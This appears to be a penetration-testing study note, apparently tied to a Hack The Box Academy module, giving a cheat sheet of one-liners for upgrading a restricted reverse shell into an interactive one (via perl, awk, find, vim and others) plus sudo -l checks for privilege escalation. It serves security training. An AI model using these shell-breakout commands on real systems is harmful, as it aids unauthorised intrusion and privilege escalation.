# Spawning Interactive Shells - [LINK](https://academy.hackthebox.com/app/module/115/section/1117)


When a reverse shell lands as a restricted "jail" or non-TTY shell and Python is unavailable, you must rely on other native Unix/Linux programming languages or system binaries to spawn an interactive prompt.

**Interactive Shell Spawning Cheat Sheet**
Replace `/bin/sh` with `/bin/bash` in any of the commands below depending on what is available on the target system.

| Tool / Language | Command syntax | Notes |
| --- | --- | --- |
| **Native Shell** | `/bin/sh -i` | The simplest method. Forces the shell interpreter into interactive mode (`-i`). |
| **Perl** | `perl -e 'exec "/bin/sh";'` | Can be run directly from the command line. |
| **Ruby** | `ruby: exec "/bin/sh"` | Typically executed from within a Ruby script. |
| **Lua** | `lua: os.execute('/bin/sh')` | Typically executed from within a Lua script. |
| **AWK** | `awk 'BEGIN {system("/bin/sh")}'` | AWK is present on almost all Unix/Linux systems for reporting. |
| **Find** | `find . -exec /bin/sh \; -quit` | Hijacks the `-exec` flag of the `find` command to launch a shell. |
| **Vim (CLI)** | `vim -c ':!/bin/sh'` | Launches Vim and instantly passes a shell execution command. |
| **Vim (Internal)** | `:set shell=/bin/sh`<br>

<br>`:shell` | Used if you are already trapped inside a Vim editor session. |

**Verifying Execution Permissions**
Before attempting to spawn shells or escalate privileges, verify the context of your current user account:

* **Check specific binary access:** `ls -la /path/to/binary` (Ensure your user has execute `x` permissions).
* **Check sudo privileges:** `sudo -l` (Lists commands your user is allowed to run as root. *Note: This command usually requires a stable, interactive shell to return output properly*).
